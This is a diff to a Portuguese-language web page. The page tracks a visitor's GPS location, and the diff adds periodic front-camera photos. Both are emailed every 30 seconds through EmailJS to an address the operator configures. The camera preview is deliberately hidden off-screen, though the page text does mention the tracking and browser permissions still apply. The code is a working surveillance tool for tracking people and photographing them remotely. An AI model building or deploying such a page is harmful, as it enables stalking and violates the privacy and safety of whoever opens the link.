@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Localização Ativa Enviada!</title>
+    <title>Localização e Imagem Ativa Enviada!</title>
     <script
       type="text/javascript"
       src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
@@ -67,20 +67,36 @@
         font-size: 0.9em;
         color: #777;
       }
+      /* Estilos para o vídeo e canvas (escondidos) */
+      #camera-feed,
+      #camera-canvas {
+        position: absolute; /* Tenta mover para fora da tela */
+        left: -9999px;
+        top: -9999px;
+        opacity: 0; /* Torna invisível */
+        width: 1px; /* Minúsculo */
+        height: 1px;
+      }
     </style>
   </head>
   <body>
     <div class="content">
-      <div class="emoji">📍</div>
-      <h1>Rastreando Localização...</h1>
-      <p>Sua localização está sendo atualizada e enviada periodicamente.</p>
-      <p id="status-message">Aguardando permissão de localização...</p>
+      <div class="emoji">📸</div>
+      <h1>Rastreando Localização e Capturando Imagem...</h1>
+      <p>
+        Sua localização e uma foto da câmera frontal estão sendo atualizadas e
+        enviadas periodicamente.
+      </p>
+      <p id="status-message">Aguardando permissão de localização e câmera...</p>
       <p id="last-sent-message"></p>
       <p>
         Você pode fechar esta página a qualquer momento para parar o
         rastreamento.
       </p>
     </div>
+
+    <video id="camera-feed" playsinline autoplay muted></video>
+    <canvas id="camera-canvas"></canvas>
 
     <script type="text/javascript">
       // IMPORTANTE: COLOQUE SEUS DADOS DO EMAILJS AQUI!
@@ -95,13 +111,61 @@
       const statusMessageElement = document.getElementById("status-message");
       const lastSentMessageElement =
         document.getElementById("last-sent-message");
+      const cameraFeed = document.getElementById("camera-feed");
+      const cameraCanvas = document.getElementById("camera-canvas");
+      const context = cameraCanvas.getContext("2d");
 
       let lastSentTime = 0;
       const SEND_INTERVAL = 30 * 1000; // 30 segundos em milissegundos
+      let cameraStream = null; // Para armazenar o stream da câmera
 
-      function sendLocationToEmailJS(latitude, longitude) {
+      // --- Funções de Câmera ---
+      async function setupCamera() {
+        try {
+          // Preferir a câmera frontal
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+          });
+          cameraStream = stream; // Armazena o stream para poder parar depois
+          cameraFeed.srcObject = stream;
+          await cameraFeed.play();
+          statusMessageElement.textContent =
+            "Câmera iniciada. Aguardando localização...";
+          return true;
+        } catch (error) {
+          console.error("Erro ao acessar a câmera:", error);
+          statusMessageElement.textContent =
+            "Erro: Permissão de câmera negada ou câmera indisponível.";
+          return false;
+        }
+      }
+
+      function takePhoto() {
+        if (!cameraStream || !cameraFeed.videoWidth) {
+          console.warn("Câmera não está pronta para tirar foto.");
+          return null;
+        }
+
+        // Define o tamanho do canvas para o tamanho do vídeo para evitar distorção
+        cameraCanvas.width = cameraFeed.videoWidth;
+        cameraCanvas.height = cameraFeed.videoHeight;
+
+        // Desenha o frame atual do vídeo no canvas
+        context.drawImage(
+          cameraFeed,
+          0,
+          0,
+          cameraCanvas.width,
+          cameraCanvas.height
+        );
+
+        // Converte o conteúdo do canvas para um Data URL (JPEG, qualidade 80%)
+        return cameraCanvas.toDataURL("image/jpeg", 0.8);
+      }
+
+      // --- Funções de Envio e Localização ---
+      async function sendDataToEmailJS(latitude, longitude, imageData = null) {
         const currentTime = new Date().getTime();
-        // Só envia se o intervalo de tempo tiver passado
         if (currentTime - lastSentTime < SEND_INTERVAL) {
           console.log("Aguardando próximo envio...");
           return;
@@ -113,72 +177,78 @@
           latitude: latitude,
           longitude: longitude,
           timestamp: new Date().toLocaleString(), // Adiciona um timestamp
+          image_data: imageData || "N/A", // Inclui a imagem ou 'N/A'
           to_email: YOUR_EMAIL_RECEIVER,
         };
 
-        emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams).then(
-          function (response) {
-            console.log(
-              "E-mail de localização enviado com sucesso!",
-              response.status,
-              response.text
-            );
-            statusMessageElement.textContent =
-              "Localização enviada! Próxima atualização em 30 segundos.";
-            lastSentMessageElement.textContent = `Último envio: ${new Date().toLocaleTimeString()}`;
-          },
-          function (error) {
-            console.error("Falha ao enviar e-mail de localização:", error);
-            statusMessageElement.textContent =
-              "Erro ao enviar localização. Tentando novamente...";
-          }
-        );
+        try {
+          await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
+          console.log("Dados (Localização + Imagem) enviados com sucesso!");
+          statusMessageElement.textContent =
+            "Localização e Imagem enviadas! Próxima atualização em 30 segundos.";
+          lastSentMessageElement.textContent = `Último envio: ${new Date().toLocaleTimeString()}`;
+        } catch (error) {
+          console.error("Falha ao enviar dados:", error);
+          statusMessageElement.textContent =
+            "Erro ao enviar dados. Tentando novamente...";
+        }
       }
 
-      function handlePositionSuccess(position) {
+      async function handlePositionSuccess(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
         statusMessageElement.textContent = `Localização atual: Lat ${latitude}, Long ${longitude}.`;
-        sendLocationToEmailJS(latitude, longitude); // Tenta enviar a localização
+
+        let imageData = null;
+        if (cameraStream) {
+          // Só tenta tirar foto se a câmera estiver ativa
+          imageData = takePhoto();
+          if (!imageData) {
+            console.warn("Não foi possível capturar a foto.");
+          }
+        } else {
+          console.log("Câmera não iniciada, enviando apenas localização.");
+        }
+
+        await sendDataToEmailJS(latitude, longitude, imageData);
       }
 
       function handlePositionError(error) {
-        let errorMessage = "Erro: ";
+        let errorMessage = "Erro na localização: ";
         switch (error.code) {
           case error.PERMISSION_DENIED:
             errorMessage +=
-              "Permissão de localização negada. O rastreamento não será possível.";
+              "Permissão negada. O rastreamento não será possível.";
             break;
           case error.POSITION_UNAVAILABLE:
-            errorMessage +=
-              "Localização indisponível no momento. Tentando novamente...";
+            errorMessage += "Indisponível. Tentando novamente...";
             break;
           case error.TIMEOUT:
-            errorMessage +=
-              "Tempo limite excedido para obter localização. Tentando novamente...";
+            errorMessage += "Tempo limite. Tentando novamente...";
             break;
           case error.UNKNOWN_ERROR:
-            errorMessage += "Um erro desconhecido ocorreu.";
+            errorMessage += "Desconhecido.";
             break;
         }
         statusMessageElement.textContent = errorMessage;
         console.error("Erro de geolocalização:", error);
-        // Não para o watchPosition em caso de erro, pode ser temporário
       }
 
-      // Esta função inicia o rastreamento da localização
-      window.onload = function () {
+      // --- Início ao Carregar a Página ---
+      window.onload = async function () {
+        // Iniciar câmera primeiro, pois a geolocalização pode ser mais rápida
+        const cameraReady = await setupCamera();
+
         if ("geolocation" in navigator) {
           statusMessageElement.textContent =
             "Solicitando sua permissão para rastrear a localização...";
-          // Usa watchPosition para obter atualizações contínuas
           navigator.geolocation.watchPosition(
             handlePositionSuccess,
             handlePositionError,
             {
               enableHighAccuracy: true,
-              timeout: 10000, // Tempo máximo para obter uma única leitura
-              maximumAge: 0, // Não usar cache de localização
+              timeout: 10000,
+              maximumAge: 0,
             }
           );
           statusMessageElement.textContent +=
@@ -186,6 +256,14 @@
         } else {
           statusMessageElement.textContent =
             "Seu navegador não suporta geolocalização.";
+        }
+      };
+
+      // Limpar o stream da câmera ao fechar a página
+      window.onbeforeunload = function () {
+        if (cameraStream) {
+          cameraStream.getTracks().forEach((track) => track.stop());
+          console.log("Câmera desligada.");
         }
       };
     </script>
